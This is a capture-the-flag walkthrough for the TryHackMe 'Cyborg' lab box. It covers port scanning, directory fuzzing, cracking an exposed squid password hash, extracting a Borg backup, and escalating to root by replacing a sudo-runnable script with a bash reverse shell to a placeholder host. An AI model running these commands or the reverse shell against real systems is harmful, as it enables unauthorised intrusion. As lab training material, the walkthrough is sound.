```bash
# PLATFORM          . THM
# CTF NAME          . Cyborg
# DESCRIPTION       . A box involving encrypted archives, source code analysis and more.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/cyborgt8
```

```bash
sudo nmap -sSVC -T5 10.10.143.145 -p- -oN cyborg
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I have started a fuzzer while the nmap scan was running.

```
ffuf -u http://10.10.143.145/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
etc                     [Status: 301, Size: 312, Words: 20, Lines: 10]
```

- Inside `/etc` we find a directory called `squid` containing two files, `passwd` and `squid.conf`. 

```squid.conf
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

```passwd
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

- We got the hash for whatever is `music_archive`.

- Running a simple `john` against this file reveals the password.

```
squidward        (music_archive)     
```

- The `admin` page has some information laying around, a stupid conversation - but the piece of information that matters to us is located in `Archive - Download`.

- We will download a `archive.tar` file that can be unzipped using `tar -xf`. It contains a folder called `home`. 

- By navigating to `/home/field/dev/final_archive` all we can find is some files that aren't of much use to us - in this form, at least.

```
config  data  hints.5  index.5  integrity.5  nonce  README
```

```README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

- So we know this is a Borg Backup. After some googling around, I found out that it can be easily installed and `borg list [path]` can be used to list Borg Backups in a certain path.

- Using `borg list /home/field/dev/final_archive` will ask for a passphase, which is the password found above.

```
music_archive                        Tue, 2020-12-29 16:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

- It seems that there's one Borg Backup. Let's extract it.

```
borg extract -v --list home/field/dev/final_archive/::music_archive
```

```
home/alex
home/alex/.bashrc
home/alex/.bash_logout
home/alex/.profile
home/alex/Music
home/alex/.bash_history
home/alex/.dbus
home/alex/.dbus/session-bus
home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
home/alex/.config

{trimmed for readability}

home/alex/.config/ibus
home/alex/.config/ibus/bus
home/alex/Documents
home/alex/Documents/note.txt
home/alex/Public
home/alex/Videos
home/alex/Desktop
home/alex/Desktop/secret.txt
home/alex/Downloads
home/alex/Templates
home/alex/Pictures
```

```bash
find . -name *.txt 

./Desktop/secret.txt
./Documents/note.txt
```

```secret
shoutout to all the people who have gotten to this stage whoop whoop!"
```

```note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:{redacted}
```

- Alright, so we have access to the box now. 

```
sudo -l

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- A simple cat reveals the source code of the script, which, in short, does backup of .mp3 files.

- However, a `ls -l` reveals that this file is owned by us, so we can replace its content with anything we like. And ...  you know what we like :) 

- **NOTE:** Use `chmod` to allow write permissions on the file first.

- After replacing the content with a bash reverse shell, run the script as `sudo /etc/mp3backups/backup.sh`

```backup.sh
#!/bin/bash
sh -i >& /dev/tcp/ip/port 0>&1
```

- The last flag is in `/root/root.txt`